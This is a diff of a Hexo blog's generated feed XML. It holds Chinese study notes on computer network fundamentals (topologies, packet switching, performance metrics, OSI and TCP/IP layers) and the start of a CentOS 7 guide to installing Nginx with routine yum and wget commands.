-<p><code>网络</code>由若干<code>结点</code>和连接这些结点的<code>链路</code>组成。</p>
-<p>网络中的结点可以是：计算机、集线器、交换机或路由器。</p>
-<p>网络和网络还可以通过路由器互连起来，这样就构成了一个覆盖范围更大的网络，即<code>互联网</code>，又称<code>网络的网络</code>。</p>
-<p>因特网是世界上最大的互连网络。</p>
-<p><code>主机</code>：一般把连接在因特网上的计算机都称为主机。</p>
-<p><code>网络把许多计算机连接在一起，而因特网则把许多网络连接在一起。</code></p>
-<h2 id="计算机网络的定义"><a href="#计算机网络的定义" class="headerlink" title="计算机网络的定义"></a>计算机网络的定义</h2><blockquote>
-<p>计算机网络的精确定义并未统一。最简单的定义是：<br>一些<code>互连</code>的、<code>自治</code>的计算机的集合。<br><code>互连</code>指计算机之间能够进行数据通信或交换信息，<br><code>自治</code>指独立的计算机，有自己的硬件和软件，可以单端运行使用。</p>
-<p>目前通常认为计算机网络是指将不同地理位置，具有独立功能的多台计算机及网络设备通过通信线路连接起来，<br>在网络操作系统、网络管理软件及网络通信协议得共同管理和协调下实现资源共享和信息传递的计算机系统。</p>
-</blockquote>
-<h2 id="计算机网络的功能"><a href="#计算机网络的功能" class="headerlink" title="计算机网络的功能"></a>计算机网络的功能</h2><blockquote>
-<p>计算机网络向用户提供的最重要的功能有两个：</p>
-<ul>
-<li><code>连通性</code>，计算机网络使上网用户之间都可以交换信息，好像这些用户的计算机都可以彼此直接连通一样。</li>
-<li><code>共享</code>，指资源共享。</li>
-</ul>
-</blockquote>
-<h2 id="计算机网络的拓扑结构的类型"><a href="#计算机网络的拓扑结构的类型" class="headerlink" title="计算机网络的拓扑结构的类型"></a>计算机网络的拓扑结构的类型</h2><p>按工作方式分：</p>
-<ul>
-<li><code>边缘部分</code>，由所有连接在网络上的主机组成，由用户直接使用</li>
-<li><code>核心部分</code>，由大量网络和连接这些网络的路由器组成，向用户提供服务（连通性和交换）</li>
-</ul>
-<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">边缘部分的通信方式有两种：</span><br><span class="line"><span class="bullet">- </span>C/S</span><br><span class="line"><span class="bullet">- </span>P2P</span><br><span class="line"></span><br><span class="line">核心部分的路由器非常重要，它采用存储转发的方式转发分组，是实现分组交换的关键构件</span><br></pre></td></tr></table></figure>
-
-<p>按作用范围分：</p>
-<ul>
-<li><code>广域网 WAN</code>，作用范围通常为几十到几千公里，又称远程网，是因特网的核心部分。</li>
-<li><code>城域网 MAN</code>，作用范围一般是一个城市，城域网可以为一个或几个单位所拥有，也可以作为一种公用设施，用来把多个局域网进行互连，多采用以太网技术。</li>
-<li><code>局域网 LAN</code>，一般用微型计算机或工作站通过高速通信线路连接。</li>
-<li><code>个人区域网 PAN</code></li>
-</ul>
-<p>按网络使用者分类：</p>
-<ul>
-<li><code>公用网</code>，指电信公司出资建造的大型网络。</li>
-<li><code>专用网</code>，某部门、某行业自己建造的网络，不对外人提供服务。</li>
-</ul>
-<p>还有一种特殊的计算机网络：<code>接入网 AN</code>，又称本地接入网或居民接入网，用来把用户接到因特网的网络。</p>
-<blockquote>
-<ul>
-<li>星型拓扑</li>
-<li>环形拓扑</li>
-<li>总线型拓扑</li>
-<li>树形拓扑</li>
-<li>网状拓扑</li>
-<li>混合型拓扑</li>
-<li>Ad-Hoc模式（无线局域网）</li>
-<li>Infrastructure模式（无线局域网）</li>
-</ul>
-</blockquote>
-<p>因特网发展的三个阶段：</p>
-<ul>
-<li>第一阶段：从单个网络<code>ARPANET</code>向互联网发展的过程。</li>
-<li>第二阶段：三级结构的因特网<code>NSFNET</code>，分为主干网、地区网和校园网(或企业网)。</li>
-<li>第三阶段：多层次ISP结构的因特网。</li>
-</ul>
-<p><code>ISP</code>：因特网服务提供者，分为主干ISP、地区ISP、本地ISP。</p>
-<p><code>IXP</code>：因特网交换点，允许两个网络直接相连，并交换分组，而不再需要通过第三个网络来转发分组。IXP 通常工作在数据链路层的网络交换机。</p>
-<p>因特网的拓扑结构非常复杂，从工作方式上看，可以分为两大块：</p>
-<ul>
-<li><code>边缘部分</code>，由所有连接在因特网上的主机组成，由用户直接使用，用来进行通信和资源共享</li>
-<li><code>核心部分</code>，由大量网络和连接这些网络的路由器组成，为边缘部分提供服务(连通性和交换)</li>
-</ul>
-<p>边缘部分的主机又称为<code>端系统</code>。</p>
-<p>端系统之间的通信方式：</p>
-<ul>
-<li><code>C/S</code>，客户-服务器模式，两个主机通信时，一个主机主动请求服务，另一个主机收到请求后提供服务</li>
-<li><code>P2P</code>，对等模式，两个主机不区分谁是服务请求方，谁是服务提供方</li>
-</ul>
-<p>在网络核心部分起特殊作用的是路由器，它是实现分组交换的关键构件。其任务是转发收到的分组。</p>
-<p><code>电路交换</code>的特点：</p>
-<ol>
-<li>建立连接(占用通信资源)</li>
-<li>通话(一直占用通信资源)</li>
-<li>释放连接(归还通信资源)</li>
-</ol>
-<p>在通话的全部时间内，通话的两个用户始终占用端到端的通信资源。线路传输的效率十分低。</p>
-<p><code>分组交换</code>的特点：</p>
-<p>分组交换采用<code>存储转发</code>技术，要发送的数据称为<code>报文</code>，在发送之前，把较长的报文划分为更小的等长的<code>数据段</code>，在每个数据段前面加上一些必要的控制信息组成<code>首部</code>(又称包头)后，就构成了一个分组(又称包)。</p>
-<p>分组是<code>因特网传送的数据单元</code>。</p>
-<p><code>分组交换</code>的优点：</p>
-<ul>
-<li>高效，在分组传输的过程中动态分配传输带宽，对通信链路是逐段占用</li>
-<li>灵活，为每一个分组独立的选择转发路由</li>
-<li>迅速，以分组为传送单位，可以不先建立连接就能向其他主机发送分组</li>
-<li>可靠，保证可靠性的网络协议，分布式多路由的分组交换网，是网络由很好的生存性</li>
-</ul>
-<h2 id="计算机网络主要性能指标"><a href="#计算机网络主要性能指标" class="headerlink" title="计算机网络主要性能指标"></a>计算机网络主要性能指标</h2><blockquote>
-<ul>
-<li><code>速率</code>，连续在计算机网络上的主机在数字信道上传送数据的速率，又称比特率，一般指额定速率或标称速率</li>
-<li><code>带宽</code>，描述网络的通信线路传送数据的能力，在单位时间内从网络中的某一点到另一点所能通过的<code>最高速率</code></li>
-<li><code>吞吐量</code>，在单位时间内通过某个网络的数据量。</li>
-<li>时延<ul>
-<li><code>发送时延</code>，帧长(b) / 发送速率(b/s)，主机或路由器发送数据帧所需要的时间，送数据帧的第一个比特算起，到该帧的最后一个比特发送完所需的时间</li>
-<li><code>传播时延</code>，信道长度(m) / 在信道上的传播速率(m/s)，电磁波在信道中传播一定的距离需要花费的时间</li>
-<li><code>处理时延</code>，主机或路由器在收到分组时需要花费一定的时间进行处理。</li>
-<li><code>排队时延</code>，分组在经过网络传输时，要经过许多路由器，但分组在进入路由器后要先在输入队列中排队等待处理。在输出队列中排队等待转发。</li>
-</ul>
-</li>
-<li><code>时延带宽积</code>，传播时延 X 带宽，又称以比特为单位的链路长度，表示链路可以容纳多少个比特，</li>
-<li><code>往返时延RTT</code>，从发送方发送数据开始，到发送方收到来自接收方的确认，总共经历的时间。</li>
-<li>利用率，利用率过高会产生非常大的时延<ul>
-<li><code>信道利用率</code>，某信道有百分之几的时间是被利用用的。</li>
-<li><code>网络利用率</code>，全网络的信道利用率的加权平均值。</li>
-</ul>
-</li>
-</ul>
-</blockquote>
-<h2 id="计算机网络为什么分层（分层的好处）"><a href="#计算机网络为什么分层（分层的好处）" class="headerlink" title="计算机网络为什么分层（分层的好处）"></a>计算机网络为什么分层（分层的好处）</h2><p>计算机网络的分层是垂直的，分层有很多好处：</p>
-<ul>
-<li><code>保持独立</code>，各层之间是独立的，每层只实现一种相对独立的功能</li>
-<li><code>灵活性好</code>，由于各层之间是独立的，因此当任何一层实现发生变化时，不会影响其上下层，不需要时也可以直接取消这层</li>
-<li><code>结构上可分割</code>，由于各层独立，因此每一层都可以采用最合适的技术来实现</li>
-<li><code>能促进标准化工作</code></li>
-</ul>
-<p>每一层所需要完成的功能：</p>
-<ul>
-<li><code>差错控制</code>，使网络对等端的相应层次的通信更加可靠</li>
-<li><code>流量控制</code>，使发送端的发送速率不要太快，要使接收端来得及接收</li>
-<li><code>分段和重装</code>，发送端把要发送的数据块划分为更小的单位，在接收端将其还原</li>
-<li><code>复用和分用</code>，发送端几个高层会话复用一条底层的连接，在接收端再进行分用</li>
-<li><code>连接建立和释放</code>，交换数据前先建立一条逻辑连接，数据传送结束后释放连接</li>
-</ul>
-<h2 id="计算机网络协议"><a href="#计算机网络协议" class="headerlink" title="计算机网络协议"></a>计算机网络协议</h2><blockquote>
-<p>网络协议是为进行网络中的数据交换而建立的规则、标准或约定。</p>
-</blockquote>
-<p>这些规则明确规定了所交换的数据的格式以及有关的同步的问题</p>
-<p>网络协议由三个要素组成：</p>
-<blockquote>
-<ul>
-<li><code>语法</code>：数据与控制信息的结构或格式（所交换的信息的格式）</li>
-<li><code>语义</code>：需要发出何种控制信息，完成何种动作，以及做出何种响应</li>
-<li><code>同步</code>：事件实现顺序的详细说明（收发双方的时序关系）</li>
-</ul>
-</blockquote>
-<h2 id="计算机网络服务"><a href="#计算机网络服务" class="headerlink" title="计算机网络服务"></a>计算机网络服务</h2><p>服务是垂直的，指下层为紧邻的上层提供的功能调用</p>
-<blockquote>
-<ol>
-<li>在协议的控制下，两个对等实体间的通信使得本层能够向上一层提供服务。要实现本层的协议，还需要使用下面一层所提供的服务。</li>
-<li>服务是能够被高一层的实体看得见的功能。协议的实现保证了能够向上一层提供服务，使用本层服务的实体只看得见服务，而看不见下面的协议。协议是水平的，服务是垂直的，即服务是由下层向上层通过层间接口提供的。</li>
-</ol>
-</blockquote>
-<h2 id="计算机网络接口"><a href="#计算机网络接口" class="headerlink" title="计算机网络接口"></a>计算机网络接口</h2><p>计算机网络接口是一个逻辑上的抽象的概念（并非硬件接口）</p>
-<p>它是同一系统中，相邻的两层的实体之间进行交换信息的地方，通常称为服务访问点 SAP</p>
-<h2 id="OSI-RM分层"><a href="#OSI-RM分层" class="headerlink" title="OSI/RM分层"></a>OSI/RM分层</h2><p>开放系统互连基本参考模型，是法律上的国际标准，但实际上事实上的国际标准是TCP/IP。<br>OSI/RM从上到下有七层：</p>
-<blockquote>
-<ul>
-<li>7：<code>应用层</code>，网络服务与用户应用程序之间的一个接口</li>
-<li>6：<code>表示层</code>，数据表示、数据安全、数据压缩（进行数据格式转换）</li>
-<li>5：<code>会话层</code>，会话层连接到传输层的映射，会话连接的流量控制，数据传输，会话连接恢复与释放，会话连接管理、差错控制（会话管理和数据同步）</li>
-<li>4：<code>运输层</code>，用一个寻址机制来标识一个特定的应用程序（端到端透明的传输报文）</li>
-<li>3：<code>网络层</code>，基于网络层地址进行不同网络系统间的路径选择（分组传输和路由选择）</li>
-<li>2：<code>数据链路层</code>，在物理层上建立、撤销、标识逻辑链接和链路复用，以及差错校验等功能，通过使用接收系统的硬件地址或物理地址来寻址（在链路上无差错的传输一帧一帧的信息）</li>
-<li>1：<code>物理层</code>，建立、维护和取消物理连接（将比特流放到物理介质上传送 ）</li>
-</ul>
-</blockquote>
-<p>对层次之间的数据传送单位：<code>PDU</code>-协议数据单元</p>
-<p>层与层之间的数据传送单位：<code>SDU</code>-服务数据单元</p>
-<h2 id="TCP-IP参考模型分层"><a href="#TCP-IP参考模型分层" class="headerlink" title="TCP/IP参考模型分层"></a>TCP/IP参考模型分层</h2><p>TCP/IP从上到下有4层：</p>
-<blockquote>
-<ul>
-<li>4：<code>应用层</code>（相当于OSI的5、6、7层）</li>
-<li>3：<code>运输层</code>（TCP、UDP）（相当于OSI的4层）</li>
-<li>2：<code>网际层IP</code>（相当于OSI的3层）</li>
-<li>1：<code>网络接口层</code>（相当于OSI的1、2层）</li>
-</ul>
-</blockquote>
-<p>但为了好理解，一般采用五层结构的 TCP/IP 体系来讲解：</p>
-<blockquote>
-<ul>
-<li>5：<code>应用层</code>，定义应用进程间通信和交互的规则，通过应用进程间的交互来完成特定网络应用</li>
-<li>4：<code>运输层</code>，负责向两个主机中进程间的通信提供通用的数据传输服务</li>
-<li>3：<code>网络层</code>：负责为分组交换网上的不同主机提供通信服务，同时也负责选择合适的路由，是源主机运输层所传下来的分组能够通过网络中的路由器找到目的主机</li>
-<li>2：<code>数据链路层</code>，将网络层交下来的IP数据报组装成帧，在两个相邻结点间的链路上传送帧</li>
-<li>1：<code>物理层</code></li>
-</ul>
-</blockquote>
-<p>各层的数据单元、单位：</p>
-<ul>
-<li>应用层：<code>报文</code></li>
-<li>传输层：<ul>
-<li>TCP：<code>报文段</code></li>
-<li>UDP：<code>用户数据报</code></li>
-</ul>
-</li>
-<li>网络层：<code>IP数据报</code>（分组、包、数据报）</li>
-<li>数据链路层：<code>帧</code></li>
-<li>物理层：<code>比特</code></li>
-</ul>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 数据库 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>计算机网络笔记[概述]</title>
+      <link href="/2020/02/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+      <url>/2020/02/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/2020-2-24ZoomOut_ZH-CN4471982075_1920x1080.jpg" alt=""></p><a id="more"></a><h1 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 - 概述"></a>第一章 - 概述</h1><p>21世纪的重要特征：<code>数字化</code>、<code>网络化</code>、<code>信息化</code>，它是一个<code>以网络为核心的信息时代</code>。<br>三网：<code>电信网络</code>，<code>有线电视网络</code>，<code>计算机网络</code></p><p>因特网起源于美国，是世界上最大的国际性计算机互联网。</p><p><code>网络</code>由若干<code>结点</code>和连接这些结点的<code>链路</code>组成。</p><p>网络中的结点可以是：计算机、集线器、交换机或路由器。</p><p>网络和网络还可以通过路由器互连起来，这样就构成了一个覆盖范围更大的网络，即<code>互联网</code>，又称<code>网络的网络</code>。</p><p>因特网是世界上最大的互连网络。</p><p><code>主机</code>：一般把连接在因特网上的计算机都称为主机。</p><p><code>网络把许多计算机连接在一起，而因特网则把许多网络连接在一起。</code></p><h2 id="计算机网络的定义"><a href="#计算机网络的定义" class="headerlink" title="计算机网络的定义"></a>计算机网络的定义</h2><blockquote><p>计算机网络的精确定义并未统一。最简单的定义是：<br>一些<code>互连</code>的、<code>自治</code>的计算机的集合。<br><code>互连</code>指计算机之间能够进行数据通信或交换信息，<br><code>自治</code>指独立的计算机，有自己的硬件和软件，可以单端运行使用。</p><p>目前通常认为计算机网络是指将不同地理位置，具有独立功能的多台计算机及网络设备通过通信线路连接起来，<br>在网络操作系统、网络管理软件及网络通信协议得共同管理和协调下实现资源共享和信息传递的计算机系统。</p></blockquote><h2 id="计算机网络的功能"><a href="#计算机网络的功能" class="headerlink" title="计算机网络的功能"></a>计算机网络的功能</h2><blockquote><p>计算机网络向用户提供的最重要的功能有两个：</p><ul><li><code>连通性</code>，计算机网络使上网用户之间都可以交换信息，好像这些用户的计算机都可以彼此直接连通一样。</li><li><code>共享</code>，指资源共享。</li></ul></blockquote><h2 id="计算机网络的拓扑结构的类型"><a href="#计算机网络的拓扑结构的类型" class="headerlink" title="计算机网络的拓扑结构的类型"></a>计算机网络的拓扑结构的类型</h2><p>按工作方式分：</p><ul><li><code>边缘部分</code>，由所有连接在网络上的主机组成，由用户直接使用</li><li><code>核心部分</code>，由大量网络和连接这些网络的路由器组成，向用户提供服务（连通性和交换）</li></ul><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">边缘部分的通信方式有两种：</span><br><span class="line"><span class="bullet">- </span>C/S</span><br><span class="line"><span class="bullet">- </span>P2P</span><br><span class="line"></span><br><span class="line">核心部分的路由器非常重要，它采用存储转发的方式转发分组，是实现分组交换的关键构件</span><br></pre></td></tr></table></figure><p>按作用范围分：</p><ul><li><code>广域网 WAN</code>，作用范围通常为几十到几千公里，又称远程网，是因特网的核心部分。</li><li><code>城域网 MAN</code>，作用范围一般是一个城市，城域网可以为一个或几个单位所拥有，也可以作为一种公用设施，用来把多个局域网进行互连，多采用以太网技术。</li><li><code>局域网 LAN</code>，一般用微型计算机或工作站通过高速通信线路连接。</li><li><code>个人区域网 PAN</code></li></ul><p>按网络使用者分类：</p><ul><li><code>公用网</code>，指电信公司出资建造的大型网络。</li><li><code>专用网</code>，某部门、某行业自己建造的网络，不对外人提供服务。</li></ul><p>还有一种特殊的计算机网络：<code>接入网 AN</code>，又称本地接入网或居民接入网，用来把用户接到因特网的网络。</p><blockquote><ul><li>星型拓扑</li><li>环形拓扑</li><li>总线型拓扑</li><li>树形拓扑</li><li>网状拓扑</li><li>混合型拓扑</li><li>Ad-Hoc模式（无线局域网）</li><li>Infrastructure模式（无线局域网）</li></ul></blockquote><p>因特网发展的三个阶段：</p><ul><li>第一阶段：从单个网络<code>ARPANET</code>向互联网发展的过程。</li><li>第二阶段：三级结构的因特网<code>NSFNET</code>，分为主干网、地区网和校园网(或企业网)。</li><li>第三阶段：多层次ISP结构的因特网。</li></ul><p><code>ISP</code>：因特网服务提供者，分为主干ISP、地区ISP、本地ISP。</p><p><code>IXP</code>：因特网交换点，允许两个网络直接相连，并交换分组，而不再需要通过第三个网络来转发分组。IXP 通常工作在数据链路层的网络交换机。</p><p>因特网的拓扑结构非常复杂，从工作方式上看，可以分为两大块：</p><ul><li><code>边缘部分</code>，由所有连接在因特网上的主机组成，由用户直接使用，用来进行通信和资源共享</li><li><code>核心部分</code>，由大量网络和连接这些网络的路由器组成，为边缘部分提供服务(连通性和交换)</li></ul><p>边缘部分的主机又称为<code>端系统</code>。</p><p>端系统之间的通信方式：</p><ul><li><code>C/S</code>，客户-服务器模式，两个主机通信时，一个主机主动请求服务，另一个主机收到请求后提供服务</li><li><code>P2P</code>，对等模式，两个主机不区分谁是服务请求方，谁是服务提供方</li></ul><p>在网络核心部分起特殊作用的是路由器，它是实现分组交换的关键构件。其任务是转发收到的分组。</p><p><code>电路交换</code>的特点：</p><ol><li>建立连接(占用通信资源)</li><li>通话(一直占用通信资源)</li><li>释放连接(归还通信资源)</li></ol><p>在通话的全部时间内，通话的两个用户始终占用端到端的通信资源。线路传输的效率十分低。</p><p><code>分组交换</code>的特点：</p><p>分组交换采用<code>存储转发</code>技术，要发送的数据称为<code>报文</code>，在发送之前，把较长的报文划分为更小的等长的<code>数据段</code>，在每个数据段前面加上一些必要的控制信息组成<code>首部</code>(又称包头)后，就构成了一个分组(又称包)。</p><p>分组是<code>因特网传送的数据单元</code>。</p><p><code>分组交换</code>的优点：</p><ul><li>高效，在分组传输的过程中动态分配传输带宽，对通信链路是逐段占用</li><li>灵活，为每一个分组独立的选择转发路由</li><li>迅速，以分组为传送单位，可以不先建立连接就能向其他主机发送分组</li><li>可靠，保证可靠性的网络协议，分布式多路由的分组交换网，是网络由很好的生存性</li></ul><h2 id="计算机网络主要性能指标"><a href="#计算机网络主要性能指标" class="headerlink" title="计算机网络主要性能指标"></a>计算机网络主要性能指标</h2><blockquote><ul><li><code>速率</code>，连续在计算机网络上的主机在数字信道上传送数据的速率，又称比特率，一般指额定速率或标称速率</li><li><code>带宽</code>，描述网络的通信线路传送数据的能力，在单位时间内从网络中的某一点到另一点所能通过的<code>最高速率</code></li><li><code>吞吐量</code>，在单位时间内通过某个网络的数据量。</li><li>时延<ul><li><code>发送时延</code>，帧长(b) / 发送速率(b/s)，主机或路由器发送数据帧所需要的时间，送数据帧的第一个比特算起，到该帧的最后一个比特发送完所需的时间</li><li><code>传播时延</code>，信道长度(m) / 在信道上的传播速率(m/s)，电磁波在信道中传播一定的距离需要花费的时间</li><li><code>处理时延</code>，主机或路由器在收到分组时需要花费一定的时间进行处理。</li><li><code>排队时延</code>，分组在经过网络传输时，要经过许多路由器，但分组在进入路由器后要先在输入队列中排队等待处理。在输出队列中排队等待转发。</li></ul></li><li><code>时延带宽积</code>，传播时延 X 带宽，又称以比特为单位的链路长度，表示链路可以容纳多少个比特，</li><li><code>往返时延RTT</code>，从发送方发送数据开始，到发送方收到来自接收方的确认，总共经历的时间。</li><li>利用率，利用率过高会产生非常大的时延<ul><li><code>信道利用率</code>，某信道有百分之几的时间是被利用用的。</li><li><code>网络利用率</code>，全网络的信道利用率的加权平均值。</li></ul></li></ul></blockquote><h2 id="计算机网络为什么分层（分层的好处）"><a href="#计算机网络为什么分层（分层的好处）" class="headerlink" title="计算机网络为什么分层（分层的好处）"></a>计算机网络为什么分层（分层的好处）</h2><p>计算机网络的分层是垂直的，分层有很多好处：</p><ul><li><code>保持独立</code>，各层之间是独立的，每层只实现一种相对独立的功能</li><li><code>灵活性好</code>，由于各层之间是独立的，因此当任何一层实现发生变化时，不会影响其上下层，不需要时也可以直接取消这层</li><li><code>结构上可分割</code>，由于各层独立，因此每一层都可以采用最合适的技术来实现</li><li><code>能促进标准化工作</code></li></ul><p>每一层所需要完成的功能：</p><ul><li><code>差错控制</code>，使网络对等端的相应层次的通信更加可靠</li><li><code>流量控制</code>，使发送端的发送速率不要太快，要使接收端来得及接收</li><li><code>分段和重装</code>，发送端把要发送的数据块划分为更小的单位，在接收端将其还原</li><li><code>复用和分用</code>，发送端几个高层会话复用一条底层的连接，在接收端再进行分用</li><li><code>连接建立和释放</code>，交换数据前先建立一条逻辑连接，数据传送结束后释放连接</li></ul><h2 id="计算机网络协议"><a href="#计算机网络协议" class="headerlink" title="计算机网络协议"></a>计算机网络协议</h2><blockquote><p>网络协议是为进行网络中的数据交换而建立的规则、标准或约定。</p></blockquote><p>这些规则明确规定了所交换的数据的格式以及有关的同步的问题</p><p>网络协议由三个要素组成：</p><blockquote><ul><li><code>语法</code>：数据与控制信息的结构或格式（所交换的信息的格式）</li><li><code>语义</code>：需要发出何种控制信息，完成何种动作，以及做出何种响应</li><li><code>同步</code>：事件实现顺序的详细说明（收发双方的时序关系）</li></ul></blockquote><h2 id="计算机网络服务"><a href="#计算机网络服务" class="headerlink" title="计算机网络服务"></a>计算机网络服务</h2><p>服务是垂直的，指下层为紧邻的上层提供的功能调用</p><blockquote><ol><li>在协议的控制下，两个对等实体间的通信使得本层能够向上一层提供服务。要实现本层的协议，还需要使用下面一层所提供的服务。</li><li>服务是能够被高一层的实体看得见的功能。协议的实现保证了能够向上一层提供服务，使用本层服务的实体只看得见服务，而看不见下面的协议。协议是水平的，服务是垂直的，即服务是由下层向上层通过层间接口提供的。</li></ol></blockquote><h2 id="计算机网络接口"><a href="#计算机网络接口" class="headerlink" title="计算机网络接口"></a>计算机网络接口</h2><p>计算机网络接口是一个逻辑上的抽象的概念（并非硬件接口）</p><p>它是同一系统中，相邻的两层的实体之间进行交换信息的地方，通常称为服务访问点 SAP</p><h2 id="OSI-RM分层"><a href="#OSI-RM分层" class="headerlink" title="OSI/RM分层"></a>OSI/RM分层</h2><p>开放系统互连基本参考模型，是法律上的国际标准，但实际上事实上的国际标准是TCP/IP。<br>OSI/RM从上到下有七层：</p><blockquote><ul><li>7：<code>应用层</code>，网络服务与用户应用程序之间的一个接口</li><li>6：<code>表示层</code>，数据表示、数据安全、数据压缩（进行数据格式转换）</li><li>5：<code>会话层</code>，会话层连接到传输层的映射，会话连接的流量控制，数据传输，会话连接恢复与释放，会话连接管理、差错控制（会话管理和数据同步）</li><li>4：<code>运输层</code>，用一个寻址机制来标识一个特定的应用程序（端到端透明的传输报文）</li><li>3：<code>网络层</code>，基于网络层地址进行不同网络系统间的路径选择（分组传输和路由选择）</li><li>2：<code>数据链路层</code>，在物理层上建立、撤销、标识逻辑链接和链路复用，以及差错校验等功能，通过使用接收系统的硬件地址或物理地址来寻址（在链路上无差错的传输一帧一帧的信息）</li><li>1：<code>物理层</code>，建立、维护和取消物理连接（将比特流放到物理介质上传送 ）</li></ul></blockquote><p>对层次之间的数据传送单位：<code>PDU</code>-协议数据单元</p><p>层与层之间的数据传送单位：<code>SDU</code>-服务数据单元</p><h2 id="TCP-IP参考模型分层"><a href="#TCP-IP参考模型分层" class="headerlink" title="TCP/IP参考模型分层"></a>TCP/IP参考模型分层</h2><p>TCP/IP从上到下有4层：</p><blockquote><ul><li>4：<code>应用层</code>（相当于OSI的5、6、7层）</li><li>3：<code>运输层</code>（TCP、UDP）（相当于OSI的4层）</li><li>2：<code>网际层IP</code>（相当于OSI的3层）</li><li>1：<code>网络接口层</code>（相当于OSI的1、2层）</li></ul></blockquote><p>但为了好理解，一般采用五层结构的 TCP/IP 体系来讲解：</p><blockquote><ul><li>5：<code>应用层</code>，定义应用进程间通信和交互的规则，通过应用进程间的交互来完成特定网络应用</li><li>4：<code>运输层</code>，负责向两个主机中进程间的通信提供通用的数据传输服务</li><li>3：<code>网络层</code>：负责为分组交换网上的不同主机提供通信服务，同时也负责选择合适的路由，是源主机运输层所传下来的分组能够通过网络中的路由器找到目的主机</li><li>2：<code>数据链路层</code>，将网络层交下来的IP数据报组装成帧，在两个相邻结点间的链路上传送帧</li><li>1：<code>物理层</code></li></ul></blockquote><p>各层的数据单元、单位：</p><ul><li>应用层：<code>报文</code></li><li>传输层：<ul><li>TCP：<code>报文段</code></li><li>UDP：<code>用户数据报</code></li></ul></li><li>网络层：<code>IP数据报</code>（分组、包、数据报）</li><li>数据链路层：<code>帧</code></li><li>物理层：<code>比特</code></li></ul>]]></content>
+      
+      
       <categories>
-        <category>学习笔记</category>
+          
+          <category> 学习笔记 </category>
+          
       </categories>
-      <tags>
-        <tag>计算机网络</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>环境搭建</title>
-    <url>/2020/02/11/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p> CentOs 7 搭建Nginx+php-fpm+MySQL记录</p>
-<p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/1.jpg" alt=""></p>
-<a id="more"></a>
-
-<h1 id="CentOs-7-搭建Nginx-php-fpm-MySQL记录"><a href="#CentOs-7-搭建Nginx-php-fpm-MySQL记录" class="headerlink" title="CentOs 7 搭建Nginx+php-fpm+MySQL记录"></a>CentOs 7 搭建Nginx+php-fpm+MySQL记录</h1><p>操作系统：CentOs 7</p>
-<h2 id="一-安装Nginx"><a href="#一-安装Nginx" class="headerlink" title="一 安装Nginx"></a>一 安装Nginx</h2><h3 id="1-1添加yum源"><a href="#1-1添加yum源" class="headerlink" title="1.1添加yum源"></a>1.1添加yum源</h3><p>安装wget：</p>
-<pre><code>yum install wget -y</code></pre><p>下载对应当前系统版本的nginx包</p>
-<pre><code>wget http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm</code></pre><p>由于Nginx不在默认的yum源中，所以需要建立nginx的yum仓库。</p>
-<pre><code>rpm -ivh nginx-release-centos-7-0.el7.ngx.noarch.rpm</code></pre><p>安装好yum源后，可以查看一下。</p>
-<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">[<span class="symbol">root@</span>root ~]# yum repolist</span><br><span class="line">Loaded plugins: fastestmirror</span><br><span class="line">Loading mirror speeds <span class="keyword">from</span> cached hostfile</span><br><span class="line"> * base: mirrors.aliyun.com</span><br><span class="line"> * extras: mirrors.aliyun.com</span><br><span class="line"> * updates: mirrors.aliyun.com</span><br><span class="line">repo id                                repo name                                                            status</span><br><span class="line">base/<span class="number">7</span>/x86_64                          CentOS<span class="number">-7</span> - Base - mirrors.aliyun.com                                 <span class="number">10</span>,<span class="number">097</span></span><br><span class="line">epel/x86_64                            Extra Packages <span class="keyword">for</span> Enterprise Linux <span class="number">7</span> - x86_64                       <span class="number">13</span>,<span class="number">524</span></span><br><span class="line">extras/<span class="number">7</span>/x86_64                        CentOS<span class="number">-7</span> - Extras - mirrors.aliyun.com                                  <span class="number">323</span></span><br><span class="line">nginx/x86_64                           nginx repo                                                              <span class="number">172</span></span><br><span class="line">updates/<span class="number">7</span>/x86_64                       CentOS<span class="number">-7</span> - Updates - mirrors.aliyun.com                               <span class="number">1</span>,<span class="number">446</span></span><br><span class="line">repolist: <span class="number">25</span>,<span class="number">562</span></span><br></pre></td></tr></table></figure>
-
-<p>可以发现Nginx repo 已经安装到本机了。</p>
-<p>由于下载过程中yum的官方源太慢了，这里把yum源换成了阿里云的。</p>
-<p>第一步：进入yum源配置文件所在文件夹</p>
-<pre><code>cd /etc/yum.repos.d/</code></pre><p>第二步：备份/etc/yum.repos.d/CentOS-Base.repo；</p>
-<pre><code>mv ./CentOS-Base.repo ./CentOS-Base.repo.bak</code></pre><p>第三步：下载aliyun的yum源配置文件，放入/etc/yum.repos.d/下，并更改名称为CentOS-Base.repo；</p>
-<pre><code>wget http://mirrors.aliyun.com/repo/Centos-7.repo
-mv Centos-7.repo CentOS-Base.repo</code></pre><p>第四步：运行yum makecache生成缓存:</p>
-<pre><code>yum makecache</code></pre><p>第四步：更新yum:</p>
-<pre><code>yum -y update</code></pre><p><img src="https://raw.githubusercontent.com/dream-knight/Blog_Picture_Bed/master/img/LNMP4.png" alt=""></p>
